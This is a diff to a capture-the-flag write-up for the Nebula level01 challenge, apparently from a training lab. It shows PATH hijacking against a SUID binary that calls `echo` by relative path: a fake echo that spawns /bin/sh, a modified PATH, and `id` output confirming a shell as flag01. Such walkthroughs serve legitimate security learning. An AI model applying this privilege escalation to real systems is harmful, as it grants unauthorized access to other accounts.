@@ -29,23 +29,27 @@ int main(int argc, char **argv, char **envp)
 The problem in this code is use `eUID` and run `echo` command in simple relative path.
 We can cange the `$PATH` variable to run a custom echo command, because `/home/flag01/flag01` binary has `SUID` setted.
 
-Write a custom `echo` command inside `/tmp` directory:
+Write a custom `echo` command inside our home directory `/home/level01`:
 
 ```bash
-echo '/bin/sh' > /tmp/echo
+echo '/bin/sh' > /home/level01/echo
 ```
 
-Now change the `$PATH` variabile adding `/tmp` at the start:
-
+Make this script executable:
 ```bash
-export PATH=/tmp:$PATH
+chmod +x /home/level01/echo
 ```
 
-Now if one user launch `echo` command, he launch a `/bin/sh` shell.
-Go to `/home/flag01` directory and run `./flag01` binary to get a shell with flag01 account, verified by writing `id` command:
+Now if we change `$PATH` variabile by adding `/home/level01` at the start and execute the `/home/flag01/flag01` binary, we get a shell with flag01 account:
 
 ```bash
-level01@nebula:/home/flag01$ ./flag01 
+env PATH=/home/level01:$PATH /home/flag01/flag01
+```
+
+We can verify it, with `id` command:
+
+```bash
+level01@nebula:~$ env PATH=/home/level01:$PATH /home/flag01/flag01 
 sh-4.2$ id
 uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
 ```
